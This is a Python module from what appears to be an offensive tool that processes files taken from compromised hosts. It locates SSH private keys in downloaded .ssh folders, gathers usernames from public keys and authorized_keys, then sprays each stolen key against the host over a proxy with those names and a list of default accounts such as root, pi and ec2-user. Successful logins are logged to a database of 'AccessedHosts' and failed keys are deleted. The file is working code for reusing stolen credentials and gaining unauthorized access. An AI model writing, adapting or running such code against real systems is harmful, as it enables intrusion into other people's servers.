from pathlib import Path
import os
import sys
import ipaddress
import sqlite3

from executors.ssh_walker import Target as SSHTarget

# should add support for putty and other ssh clients


# list all directories starting in the downloads dir
def get_directories(dir_path_root: str):
    p = Path(dir_path_root)
    return [item for item in p.rglob("*")]


# test if ip address is valid or not
def test_ipaddress(address: str):
    if ":" in address:
        address = address.split(":")[0]
    try:
        ipaddress.ip_address(address)
        return True
    except ValueError:
        return False


# test if the file path is file or directory
def test_directory(posix_path: Path) -> bool:
    if posix_path.is_dir():
        return True
    return False


# get all file paths with .ssh in them
def get_ssh_files(file_list: list):
    ssh_files = []
    for file in file_list:
        posix_path_str = str(file)
        parts = posix_path_str.split("/")
        if ".ssh" in parts:
            if test_directory(file):
                continue
            ssh_files.append(file)
    return ssh_files


# test if a file is a private key
# this isnt an ideal solution but just a stop gap until a better one is found
def get_private_key(ssh_files: list):
    private_keys_found = []
    for file in ssh_files:
        with open(file, "r") as fp:
            top_line = fp.readline()
            # really weak match, but it will do for now
            if "-----" in top_line:
                private_keys_found.append(file)
    chmod_priv_keys(private_keys_found)
    return private_keys_found


def chmod_priv_keys(private_keys: list) -> None:
    for key in private_keys:
        os.chmod(key, 0o600)


def get_public_keys(ssh_files: list):
    # pub keys could be in two spots, the authorized_keys
    # or just a .pub on the file system
    public_keys_found = []
    for file in ssh_files:
        str_file_path = str(file)
        if str_file_path.split("/")[-1] == "authorized_keys":
            public_keys_found.append(file)
        elif ".pub" in str_file_path.split("/")[-1]:
            public_keys_found.append(file)
    return public_keys_found


def get_username_from_file_contents(contents: list):
    valid_usernames = set()
    blacklist = ["generated-by-azure", "imported-openssh-key"]

    for line in contents:
        sanitized_line = [x.strip() for x in line.split() if x]
        if len(sanitized_line) < 3:
            continue  # means no username at the end ssh-xxxx keyvaluehere root@targets
        else:
            username = sanitized_line[-1]
            if username in blacklist:
                continue
            else:
                if "@" in username:
                    valid_usernames.add(username.split("@")[0])
                else:
                    valid_usernames.add(username)
    return valid_usernames


def get_contents_from_pub_keys(public_keys: list):
    all_usernames = set()
    for file in public_keys:
        # its either a pub or its authorized_keys
        with open(file, "r") as fp:
            file_lines = fp.readlines()
        all_usernames.update(get_username_from_file_contents(file_lines))
    return all_usernames


def check_downloads_dir(proxy_host_port: str):
    if not os.path.isdir("downloads"):
        print(
            "[-] No downloads directory found. Run a scan with -e first to download files."
        )
        return
    get_all_targets(proxy_host_port)


def debug_get_all_targets(target: str):
    print(f"Parsing: {target}")
    print(f"Passed: {test_ipaddress(target)}")


def get_all_targets(proxy_host_port: str):
    for target in os.listdir("downloads"):
        # debug_get_all_targets(target)
        if test_ipaddress(target):
            downloaded_files = get_directories(os.path.join("downloads", target))
            # print(downloaded_files)
            ssh_files = get_ssh_files(downloaded_files)
            print(ssh_files)
            if len(ssh_files) == 0:
                continue
            # get a list of all the targets private keys
            list_of_private_keys = get_private_key(ssh_files)
            print(list_of_private_keys)
            # get a list of all the targets public keys, authorized_keys is treated as a public key in this sense
            # as it can often have a username at the end of the public key <pub key> root@hostname we want to
            # include the file and check for this to add it to our username list
            list_of_public_keys = get_public_keys(ssh_files)
            # print(list_of_public_keys)
            # parse the public keys for valid usernames and get a list of valid usernames
            usernames = get_contents_from_pub_keys(list_of_public_keys)
            do_executor(target, usernames, list_of_private_keys, proxy_host_port)


def do_executor(
    target: str, usernames_from_pub_keys: set, priv_keys: list, proxy_host_port: str
):
    usernames = [
        "root",
        "admin",
        "test",
        "guest",
        "info",
        "adm",
        "mysql",
        "user",
        "administrator",
        "oracle",
        "ftp",
        "pi",
        "puppet",
        "ansible",
        "ec2-user",
        "vagrant",
        "azureuser",
    ]
    if ":" in target:
        target = target.split(":")[0]
    comb_usernames = list(usernames_from_pub_keys) + usernames
    for priv_key in priv_keys:
        for name in comb_usernames:
            ssh_target = SSHTarget(proxy_host_port, target, 22, name, key=str(priv_key))
            print(
                f"[*] {proxy_host_port} -> {ssh_target.username}@{ssh_target.host}:{ssh_target.port} {ssh_target.key}"
            )
            client, sock = ssh_target.create_client()
            if sock == None:
                os.remove(priv_key)
                return  # ssh server not listening, move on to the next host
            if ssh_target.connect_key(client, sock):
                write_accessed_host(
                    ssh_target.host,
                    ssh_target.port,
                    ssh_target.username,
                    ssh_target.key,
                )
                return  # moves onto the next target
        # we failed do your cleanup here
        os.remove(priv_key)
        # should also see if there is a matching public key and remove that too


def write_accessed_host(host: str, port: int, username: str, key: str):
    # should also likely write the key data, can with open it here
    conn = sqlite3.connect("db/database.db")
    cursor = conn.cursor()
    # we can update the data in this table when the survey is done
    cursor.execute(
        "INSERT INTO AccessedHosts (ip_addr, port, username, key) VALUES (?, ?, ?, ?)",
        (host, port, username, key),
    )
    conn.commit()
    conn.close()
